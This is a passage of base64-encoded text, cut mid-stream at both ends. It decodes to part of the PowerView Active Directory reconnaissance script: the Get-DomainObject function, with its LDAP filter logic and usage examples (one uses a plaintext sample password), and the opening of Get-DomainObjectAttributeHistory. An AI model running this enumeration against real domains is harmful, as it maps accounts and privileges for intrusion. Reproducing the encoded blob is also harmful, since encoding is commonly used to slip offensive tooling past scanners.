sdHMgaW5zdGVhZCBvZiB0cmFuc2xhdGluZyB0aGUgZmllbGRzIGludG8gYSBjdXN0b20gUFNPYmplY3QuCgouRVhBTVBMRQoKR2V0LURvbWFpbk9iamVjdCAtRG9tYWluIHRlc3RsYWIubG9jYWwKClJldHVybiBhbGwgb2JqZWN0cyBmb3IgdGhlIHRlc3RsYWIubG9jYWwgZG9tYWluCgouRVhBTVBMRQoKJ1MtMS01LTIxLTg5MDE3MTg1OS0zNDMzODA5Mjc5LTMzNjYxOTY3NTMtMTAwMycsICdDTj1kZm0sQ049VXNlcnMsREM9dGVzdGxhYixEQz1sb2NhbCcsJ2I2YTlhMmZiLWJiZDUtNGYyOC05YTA5LTIzMjEzY2VhNjY5MycsJ2RmbS5hJyB8IEdldC1Eb21haW5PYmplY3QgLVByb3BlcnRpZXMgZGlzdGluZ3Vpc2hlZG5hbWUKCmRpc3Rpbmd1aXNoZWRuYW1lCi0tLS0tLS0tLS0tLS0tLS0tCkNOPVBSSU1BUlksT1U9RG9tYWluIENvbnRyb2xsZXJzLERDPXRlc3RsYWIsREM9bG9jYWwKQ049ZGZtLENOPVVzZXJzLERDPXRlc3RsYWIsREM9bG9jYWwKT1U9T1UzLERDPXRlc3RsYWIsREM9bG9jYWwKQ049ZGZtIChhZG1pbiksQ049VXNlcnMsREM9dGVzdGxhYixEQz1sb2NhbAoKLkVYQU1QTEUKCiRTZWNQYXNzd29yZCA9IENvbnZlcnRUby1TZWN1cmVTdHJpbmcgJ1Bhc3N3b3JkMTIzIScgLUFzUGxhaW5UZXh0IC1Gb3JjZQokQ3JlZCA9IE5ldy1PYmplY3QgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWwoJ1RFU1RMQUJcZGZtLmEnLCAkU2VjUGFzc3dvcmQpCkdldC1Eb21haW5PYmplY3QgLUNyZWRlbnRpYWwgJENyZWQgLUlkZW50aXR5ICd3aW5kb3dzMScKCi5FWEFNUExFCgpHZXQtRG9tYWluIHwgU2VsZWN0LU9iamVjdCAtRXhwYW5kIG5hbWUKdGVzdGxhYi5sb2NhbAoKJ3Rlc3RsYWJcaGFybWoweScsJ0RFVlxEb21haW4gQWRtaW5zJyB8IEdldC1Eb21haW5PYmplY3QgLVZlcmJvc2UgLVByb3BlcnRpZXMgZGlzdGluZ3Vpc2hlZG5hbWUKVkVSQk9TRTogW0dldC1Eb21haW5TZWFyY2hlcl0gc2VhcmNoIHN0cmluZzogTERBUDovL1BSSU1BUlkudGVzdGxhYi5sb2NhbC9EQz10ZXN0bGFiLERDPWxvY2FsClZFUkJPU0U6IFtHZXQtRG9tYWluVXNlcl0gRXh0cmFjdGVkIGRvbWFpbiAndGVzdGxhYi5sb2NhbCcgZnJvbSAndGVzdGxhYlxoYXJtajB5JwpWRVJCT1NFOiBbR2V0LURvbWFpblNlYXJjaGVyXSBzZWFyY2ggc3RyaW5nOiBMREFQOi8vUFJJTUFSWS50ZXN0bGFiLmxvY2FsL0RDPXRlc3RsYWIsREM9bG9jYWwKVkVSQk9TRTogW0dldC1Eb21haW5PYmplY3RdIEdldC1Eb21haW5PYmplY3QgZmlsdGVyIHN0cmluZzogKCYofChzYW1BY2NvdW50TmFtZT1oYXJtajB5KSkpCgpkaXN0aW5ndWlzaGVkbmFtZQotLS0tLS0tLS0tLS0tLS0tLQpDTj1oYXJtajB5LENOPVVzZXJzLERDPXRlc3RsYWIsREM9bG9jYWwKVkVSQk9TRTogW0dldC1Eb21haW5Vc2VyXSBFeHRyYWN0ZWQgZG9tYWluICdkZXYudGVzdGxhYi5sb2NhbCcgZnJvbSAnREVWXERvbWFpbiBBZG1pbnMnClZFUkJPU0U6IFtHZXQtRG9tYWluU2VhcmNoZXJdIHNlYXJjaCBzdHJpbmc6IExEQVA6Ly9QUklNQVJZLnRlc3RsYWIubG9jYWwvREM9ZGV2LERDPXRlc3RsYWIsREM9bG9jYWwKVkVSQk9TRTogW0dldC1Eb21haW5PYmplY3RdIEdldC1Eb21haW5PYmplY3QgZmlsdGVyIHN0cmluZzogKCYofChzYW1BY2NvdW50TmFtZT1Eb21haW4gQWRtaW5zKSkpCkNOPURvbWFpbiBBZG1pbnMsQ049VXNlcnMsREM9ZGV2LERDPXRlc3RsYWIsREM9bG9jYWwKCi5PVVRQVVRTCgpQb3dlclZpZXcuQURPYmplY3QKCkN1c3RvbSBQU09iamVjdCB3aXRoIHRyYW5zbGF0ZWQgQUQgb2JqZWN0IHByb3BlcnR5IGZpZWxkcy4KClBvd2VyVmlldy5BRE9iamVjdC5SYXcKClRoZSByYXcgRGlyZWN0b3J5U2VydmljZXMuU2VhcmNoUmVzdWx0IG9iamVjdCwgaWYgLVJhdyBpcyBlbmFibGVkLgojPgoKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1VzZURlY2xhcmVkVmFyc01vcmVUaGFuQXNzaWdubWVudHMnLCAnJyldCiAgICBbT3V0cHV0VHlwZSgnUG93ZXJWaWV3LkFET2JqZWN0JyldCiAgICBbT3V0cHV0VHlwZSgnUG93ZXJWaWV3LkFET2JqZWN0LlJhdycpXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtBbGlhcygnRGlzdGluZ3Vpc2hlZE5hbWUnLCAnU2FtQWNjb3VudE5hbWUnLCAnTmFtZScsICdNZW1iZXJEaXN0aW5ndWlzaGVkTmFtZScsICdNZW1iZXJOYW1lJyldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRJZGVudGl0eSwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW4sCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdGaWx0ZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRMREFQRmlsdGVyLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkUHJvcGVydGllcywKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0FEU1BhdGgnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWFyY2hCYXNlLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRG9tYWluQ29udHJvbGxlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlcnZlciwKCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdCYXNlJywgJ09uZUxldmVsJywgJ1N1YnRyZWUnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWFyY2hTY29wZSA9ICdTdWJ0cmVlJywKCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFJlc3VsdFBhZ2VTaXplID0gMjAwLAoKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkU2VydmVyVGltZUxpbWl0LAoKICAgICAgICBbVmFsaWRhdGVTZXQoJ0RhY2wnLCAnR3JvdXAnLCAnTm9uZScsICdPd25lcicsICdTYWNsJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VjdXJpdHlNYXNrcywKCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkVG9tYnN0b25lLAoKICAgICAgICBbQWxpYXMoJ1JldHVybk9uZScpXQogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJEZpbmRPbmUsCgogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eSwKCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkUmF3CiAgICApCgogICAgRHluYW1pY1BhcmFtIHsKICAgICAgICAkVUFDVmFsdWVOYW1lcyA9IFtFbnVtXTo6R2V0TmFtZXMoJFVBQ0VudW0pCiAgICAgICAgIyBhZGQgaW4gdGhlIG5lZ2F0aW9ucwogICAgICAgICRVQUNWYWx1ZU5hbWVzID0gJFVBQ1ZhbHVlTmFtZXMgfCBGb3JFYWNoLU9iamVjdCB7JF87ICJOT1RfJF8ifQogICAgICAgICMgY3JlYXRlIG5ldyBkeW5hbWljIHBhcmFtZXRlcgogICAgICAgIE5ldy1EeW5hbWljUGFyYW1ldGVyIC1OYW1lIFVBQ0ZpbHRlciAtVmFsaWRhdGVTZXQgJFVBQ1ZhbHVlTmFtZXMgLVR5cGUgKFthcnJheV0pCiAgICB9CgogICAgQkVHSU4gewogICAgICAgICRTZWFyY2hlckFyZ3VtZW50cyA9IEB7fQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snRG9tYWluJ10gPSAkRG9tYWluIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydQcm9wZXJ0aWVzJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydQcm9wZXJ0aWVzJ10gPSAkUHJvcGVydGllcyB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoQmFzZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoQmFzZSddID0gJFNlYXJjaEJhc2UgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlciddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyJ10gPSAkU2VydmVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hTY29wZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoU2NvcGUnXSA9ICRTZWFyY2hTY29wZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmVzdWx0UGFnZVNpemUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1Jlc3VsdFBhZ2VTaXplJ10gPSAkUmVzdWx0UGFnZVNpemUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlclRpbWVMaW1pdCddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyVGltZUxpbWl0J10gPSAkU2VydmVyVGltZUxpbWl0IH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWN1cml0eU1hc2tzJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWN1cml0eU1hc2tzJ10gPSAkU2VjdXJpdHlNYXNrcyB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVG9tYnN0b25lJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydUb21ic3RvbmUnXSA9ICRUb21ic3RvbmUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KICAgICAgICAkT2JqZWN0U2VhcmNoZXIgPSBHZXQtRG9tYWluU2VhcmNoZXIgQFNlYXJjaGVyQXJndW1lbnRzCiAgICB9CgogICAgUFJPQ0VTUyB7CiAgICAgICAgI2JpbmQgZHluYW1pYyBwYXJhbWV0ZXIgdG8gYSBmcmllbmRseSB2YXJpYWJsZQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnMgLWFuZCAoJFBTQm91bmRQYXJhbWV0ZXJzLkNvdW50IC1uZSAwKSkgewogICAgICAgICAgICBOZXctRHluYW1pY1BhcmFtZXRlciAtQ3JlYXRlVmFyaWFibGVzIC1Cb3VuZFBhcmFtZXRlcnMgJFBTQm91bmRQYXJhbWV0ZXJzCiAgICAgICAgfQogICAgICAgIGlmICgkT2JqZWN0U2VhcmNoZXIpIHsKICAgICAgICAgICAgJElkZW50aXR5RmlsdGVyID0gJycKICAgICAgICAgICAgJEZpbHRlciA9ICcnCiAgICAgICAgICAgICRJZGVudGl0eSB8IFdoZXJlLU9iamVjdCB7JF99IHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgJElkZW50aXR5SW5zdGFuY2UgPSAkXy5SZXBsYWNlKCcoJywgJ1wyOCcpLlJlcGxhY2UoJyknLCAnXDI5JykKICAgICAgICAgICAgICAgIGlmICgkSWRlbnRpdHlJbnN0YW5jZSAtbWF0Y2ggJ15TLTEtJykgewogICAgICAgICAgICAgICAgICAgICRJZGVudGl0eUZpbHRlciArPSAiKG9iamVjdHNpZD0kSWRlbnRpdHlJbnN0YW5jZSkiCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlaWYgKCRJZGVudGl0eUluc3RhbmNlIC1tYXRjaCAnXihDTnxPVXxEQyk9JykgewogICAgICAgICAgICAgICAgICAgICRJZGVudGl0eUZpbHRlciArPSAiKGRpc3Rpbmd1aXNoZWRuYW1lPSRJZGVudGl0eUluc3RhbmNlKSIKICAgICAgICAgICAgICAgICAgICBpZiAoKC1ub3QgJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSkgLWFuZCAoLW5vdCAkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaEJhc2UnXSkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgIyBpZiBhIC1Eb21haW4gaXNuJ3QgZXhwbGljaXRseSBzZXQsIGV4dHJhY3QgdGhlIG9iamVjdCBkb21haW4gb3V0IG9mIHRoZSBkaXN0aW5ndWlzaGVkbmFtZQogICAgICAgICAgICAgICAgICAgICAgICAjICAgYW5kIHJlYnVpbGQgdGhlIGRvbWFpbiBzZWFyY2hlcgogICAgICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHlEb21haW4gPSAkSWRlbnRpdHlJbnN0YW5jZS5TdWJTdHJpbmcoJElkZW50aXR5SW5zdGFuY2UuSW5kZXhPZignREM9JykpIC1yZXBsYWNlICdEQz0nLCcnIC1yZXBsYWNlICcsJywnLicKICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5PYmplY3RdIEV4dHJhY3RlZCBkb21haW4gJyRJZGVudGl0eURvbWFpbicgZnJvbSAnJElkZW50aXR5SW5zdGFuY2UnIgogICAgICAgICAgICAgICAgICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJElkZW50aXR5RG9tYWluCiAgICAgICAgICAgICAgICAgICAgICAgICRPYmplY3RTZWFyY2hlciA9IEdldC1Eb21haW5TZWFyY2hlciBAU2VhcmNoZXJBcmd1bWVudHMKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKC1ub3QgJE9iamVjdFNlYXJjaGVyKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbR2V0LURvbWFpbk9iamVjdF0gVW5hYmxlIHRvIHJldHJpZXZlIGRvbWFpbiBzZWFyY2hlciBmb3IgJyRJZGVudGl0eURvbWFpbiciCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlaWYgKCRJZGVudGl0eUluc3RhbmNlIC1pbWF0Y2ggJ15bMC05QS1GXXs4fS0oWzAtOUEtRl17NH0tKXszfVswLTlBLUZdezEyfSQnKSB7CiAgICAgICAgICAgICAgICAgICAgJEd1aWRCeXRlU3RyaW5nID0gKChbR3VpZF0kSWRlbnRpdHlJbnN0YW5jZSkuVG9CeXRlQXJyYXkoKSB8IEZvckVhY2gtT2JqZWN0IHsgJ1wnICsgJF8uVG9TdHJpbmcoJ1gyJykgfSkgLWpvaW4gJycKICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHlGaWx0ZXIgKz0gIihvYmplY3RndWlkPSRHdWlkQnl0ZVN0cmluZykiCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlaWYgKCRJZGVudGl0eUluc3RhbmNlLkNvbnRhaW5zKCdcJykpIHsKICAgICAgICAgICAgICAgICAgICAkQ29udmVydGVkSWRlbnRpdHlJbnN0YW5jZSA9ICRJZGVudGl0eUluc3RhbmNlLlJlcGxhY2UoJ1wyOCcsICcoJykuUmVwbGFjZSgnXDI5JywgJyknKSB8IENvbnZlcnQtQUROYW1lIC1PdXRwdXRUeXBlIENhbm9uaWNhbAogICAgICAgICAgICAgICAgICAgIGlmICgkQ29udmVydGVkSWRlbnRpdHlJbnN0YW5jZSkgewogICAgICAgICAgICAgICAgICAgICAgICAkT2JqZWN0RG9tYWluID0gJENvbnZlcnRlZElkZW50aXR5SW5zdGFuY2UuU3ViU3RyaW5nKDAsICRDb252ZXJ0ZWRJZGVudGl0eUluc3RhbmNlLkluZGV4T2YoJy8nKSkKICAgICAgICAgICAgICAgICAgICAgICAgJE9iamVjdE5hbWUgPSAkSWRlbnRpdHlJbnN0YW5jZS5TcGxpdCgnXCcpWzFdCiAgICAgICAgICAgICAgICAgICAgICAgICRJZGVudGl0eUZpbHRlciArPSAiKHNhbUFjY291bnROYW1lPSRPYmplY3ROYW1lKSIKICAgICAgICAgICAgICAgICAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICRPYmplY3REb21haW4KICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5PYmplY3RdIEV4dHJhY3RlZCBkb21haW4gJyRPYmplY3REb21haW4nIGZyb20gJyRJZGVudGl0eUluc3RhbmNlJyIKICAgICAgICAgICAgICAgICAgICAgICAgJE9iamVjdFNlYXJjaGVyID0gR2V0LURvbWFpblNlYXJjaGVyIEBTZWFyY2hlckFyZ3VtZW50cwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2VpZiAoJElkZW50aXR5SW5zdGFuY2UuQ29udGFpbnMoJy4nKSkgewogICAgICAgICAgICAgICAgICAgICRJZGVudGl0eUZpbHRlciArPSAiKHwoc2FtQWNjb3VudE5hbWU9JElkZW50aXR5SW5zdGFuY2UpKG5hbWU9JElkZW50aXR5SW5zdGFuY2UpKGRuc2hvc3RuYW1lPSRJZGVudGl0eUluc3RhbmNlKSkiCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHlGaWx0ZXIgKz0gIih8KHNhbUFjY291bnROYW1lPSRJZGVudGl0eUluc3RhbmNlKShuYW1lPSRJZGVudGl0eUluc3RhbmNlKShkaXNwbGF5bmFtZT0kSWRlbnRpdHlJbnN0YW5jZSkpIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgkSWRlbnRpdHlGaWx0ZXIgLWFuZCAoJElkZW50aXR5RmlsdGVyLlRyaW0oKSAtbmUgJycpICkgewogICAgICAgICAgICAgICAgJEZpbHRlciArPSAiKHwkSWRlbnRpdHlGaWx0ZXIpIgogICAgICAgICAgICB9CgogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydMREFQRmlsdGVyJ10pIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluT2JqZWN0XSBVc2luZyBhZGRpdGlvbmFsIExEQVAgZmlsdGVyOiAkTERBUEZpbHRlciIKICAgICAgICAgICAgICAgICRGaWx0ZXIgKz0gIiRMREFQRmlsdGVyIgogICAgICAgICAgICB9CgogICAgICAgICAgICAjIGJ1aWxkIHRoZSBMREFQIGZpbHRlciBmb3IgdGhlIGR5bmFtaWMgVUFDIGZpbHRlciB2YWx1ZQogICAgICAgICAgICAkVUFDRmlsdGVyIHwgV2hlcmUtT2JqZWN0IHskX30gfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICBpZiAoJF8gLW1hdGNoICdOT1RfLionKSB7CiAgICAgICAgICAgICAgICAgICAgJFVBQ0ZpZWxkID0gJF8uU3Vic3RyaW5nKDQpCiAgICAgICAgICAgICAgICAgICAgJFVBQ1ZhbHVlID0gW0ludF0oJFVBQ0VudW06OiRVQUNGaWVsZCkKICAgICAgICAgICAgICAgICAgICAkRmlsdGVyICs9ICIoISh1c2VyQWNjb3VudENvbnRyb2w6MS4yLjg0MC4xMTM1NTYuMS40LjgwMzo9JFVBQ1ZhbHVlKSkiCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkVUFDVmFsdWUgPSBbSW50XSgkVUFDRW51bTo6JF8pCiAgICAgICAgICAgICAgICAgICAgJEZpbHRlciArPSAiKHVzZXJBY2NvdW50Q29udHJvbDoxLjIuODQwLjExMzU1Ni4xLjQuODAzOj0kVUFDVmFsdWUpIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CgogICAgICAgICAgICBpZiAoJEZpbHRlciAtYW5kICRGaWx0ZXIgLW5lICcnKSB7CiAgICAgICAgICAgICAgICAkT2JqZWN0U2VhcmNoZXIuZmlsdGVyID0gIigmJEZpbHRlcikiCiAgICAgICAgICAgIH0KICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5PYmplY3RdIEdldC1Eb21haW5PYmplY3QgZmlsdGVyIHN0cmluZzogJCgkT2JqZWN0U2VhcmNoZXIuZmlsdGVyKSIKCiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0ZpbmRPbmUnXSkgeyAkUmVzdWx0cyA9ICRPYmplY3RTZWFyY2hlci5GaW5kT25lKCkgfQogICAgICAgICAgICBlbHNlIHsgJFJlc3VsdHMgPSAkT2JqZWN0U2VhcmNoZXIuRmluZEFsbCgpIH0KICAgICAgICAgICAgJFJlc3VsdHMgfCBXaGVyZS1PYmplY3QgeyRffSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1JhdyddKSB7CiAgICAgICAgICAgICAgICAgICAgIyByZXR1cm4gcmF3IHJlc3VsdCBvYmplY3RzCiAgICAgICAgICAgICAgICAgICAgJE9iamVjdCA9ICRfCiAgICAgICAgICAgICAgICAgICAgJE9iamVjdC5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuQURPYmplY3QuUmF3JykKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICRPYmplY3QgPSBDb252ZXJ0LUxEQVBQcm9wZXJ0eSAtUHJvcGVydGllcyAkXy5Qcm9wZXJ0aWVzCiAgICAgICAgICAgICAgICAgICAgJE9iamVjdC5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuQURPYmplY3QnKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJE9iamVjdAogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgkUmVzdWx0cykgewogICAgICAgICAgICAgICAgdHJ5IHsgJFJlc3VsdHMuZGlzcG9zZSgpIH0KICAgICAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpbk9iamVjdF0gRXJyb3IgZGlzcG9zaW5nIG9mIHRoZSBSZXN1bHRzIG9iamVjdDogJF8iCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJE9iamVjdFNlYXJjaGVyLmRpc3Bvc2UoKQogICAgICAgIH0KICAgIH0KfQoKCmZ1bmN0aW9uIEdldC1Eb21haW5PYmplY3RBdHRyaWJ1dGVIaXN0b3J5IHsKPCMKLlNZTk9QU0lTCgpSZXR1cm5zIHRoZSBBY3RpdmUgRGlyZWN0b3J5IGF0dHJpYnV0ZSByZXBsaWNhdGlvbiBtZXRhZGF0YSBmb3IgdGhlIHNwZWNpZmllZApvYmplY3QsIGkuZS4gYSBwYXJzZWQgdmVyc2lvbiBvZiB0aGUgbXNkcy1yZXBsYXR0cmlidXRlbWV0YWRhdGEgYXR0cmlidXRlLgpCeSBkZWZhdWx0LCByZXBsaWNhdGlvbiBkYXRhIGZvciBldmVyeSBkb21haW4gb2JqZWN0IGlzIHJldHVybmVkLgoKQXV0aG9yOiBXaWxsIFNjaHJvZWRlciAoQGhhcm1qMHkpICAKTGljZW5zZTogQlNEIDMtQ2xhdXNlICAKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBHZXQtRG9tYWluT2JqZWN0CgouREVTQ1JJUFRJT04KCldyYXBzIEdldC1Eb21haW5PYmplY3Qgd2l0aCBhIHNwZWNpZmljYXRpb24gdG8gcmV0cmlldmUgdGhlIHByb3BlcnR5ICdtc2RzLXJlcGxhdHRyaWJ1dGVtZXRhZGF0YScuClRoaXMgaXMgdGhlIGRvbWFpbiBhdHRyaWJ1dGUgcmVwbGljYXRpb24gbWV0YWRhdGEgYXNzb2NpYXRlZCB3aXRoIHRoZSBvYmplY3QuIFRoZSByZXN1bHRzIGFyZQpwYXJzZWQgZnJvbSB0aGVpciBYTUwgc3RyaW5nIGZvcm0gYW5kIHJldHVybmVkIGFzIGEgY3VzdG9tIG9iamVjdC4KCi5QQVJBTUVURVIgSWRlbnRpdHkKCkEgU2FtQWNjb3VudE5hbWUgKGUuZy4gaGFybWoweSksIERpc3Rpbmd1aXNoZWROYW1lIChlLmcuIENOPWhhcm1qMHksQ049VXNlcnMsREM9dGVzdGxhYixEQz1sb2NhbCksClNJRCAoZS5nLiBTLTEtNS0yMS04OTAxNzE4NTktMzQzMzgwOTI3OS0zMzY2MTk2NzUzLTExMDgpLCBvciBHVUlEIChlLmcuIDRjNDM1ZGQ3LWRjNTgtNGIxNC05YTVlLTFmZGIwZTgwZDIwMSkuCldpbGRjYXJkcyBhY2NlcHRlZC4KCi5QQVJBTUVURVIgRG9tYWluCgpTcGVjaWZpZXMgdGhlIGRvbWFpbiB0byB1c2UgZm9yIHRoZSBxdWVyeSwgZGVmYXVsdHMgdG8gdGhlIGN1cnJlbnQgZG9tYWluLgoKLlBBUkFNRVRFUiBMREFQRmlsdGVyCgpTcGVjaWZpZXMgYW4gTERBUCBxdWVyeSBzdHJpbmcgdGhhdCBpcyB1c2VkIHRvIGZpbHRlciBBY3RpdmUgRGlyZWN0b3J5IG9iamVjdHMuCgouUEFSQU1FVEVSIFByb3BlcnRpZXMKCk9ubHkgcmV0dXJuIHJlcGxpY2F0aW9uIG1ldGFkYXRhIG9uIHRoZSBzcGVjaWZpZWQgcHJvcGVydHkgbmFtZXMuCgouUEFSQU1FVEVSIFNlYXJjaEJhc2UKClRoZSBMREFQIHNvdXJjZSB0byBzZWFyY2ggdGhyb3VnaCwgZS5nLiAiTERBUDovL09VPXNlY3JldCxEQz10ZXN0bGFiLERDPWxvY2FsIgpVc2VmdWwgZm9yIE9VIHF1ZXJpZXMuCgouUEFSQU1FVEVSIFNlcnZlcgoKU3BlY2lmaWVzIGFuIEFjdGl2ZSBEaXJlY3Rvcnkgc2VydmVyIChkb21haW4gY29udHJvbGxlcikgdG8gYmluZCB0by4KCi5QQVJBTUVURVIgU2VhcmNoU2NvcGUKClNwZWNpZmllcyB0aGUgc2NvcGUgdG8gc2VhcmNoIHVuZGVyLCBCYXNlL09uZUxldmVsL1N1YnRyZWUgKGRlZmF1bHQgb2YgU3VidHJlZSkuCgouUEFSQU1FVEVSIFJlc3VsdFBhZ2VTaXplCgpTcGVjaWZpZXMgdGhlIFBhZ2VTaXplIHRvIHNldCBmb3IgdGhlIExEQVAgc2VhcmNoZXIgb2JqZWN0LgoKLlBBUkFNRVRFUiBTZXJ2ZXJUaW1lTGltaXQKClNwZWNpZmllcyB0aGUgbWF4aW11bSBhbW91bnQgb2YgdGltZSB0aGUgc2VydmVyIHNwZW5kcyBzZWFyY2hpbmcuIERlZmF1bHQgb2YgMTIwIHNlY29uZHMuCgouUEFSQU1FVEVSIFRvbWJzdG9uZQoKU3dpdGNoLiBTcGVjaWZpZXMgdGhhdCB0aGUgc2VhcmNoZXIgc2hvdWxkIGFsc28gcmV0dXJuIGRlbGV0ZWQvdG9tYnN0b25lZCBvYmplY3RzLgoKLlBBUkFNRVRFUiBDcmVkZW50aWFsCgpBIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXSBvYmplY3Qgb2YgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzCmZvciBjb25uZWN0aW9uIHRvIHRoZSB0YXJnZXQgZG9tYWluLgoKLkVYQU1QTEUKCkdldC1Eb21haW5PYmplY3RBdHRyaWJ1dGVIaXN0b3J5IC1Eb21haW4gdGVzdG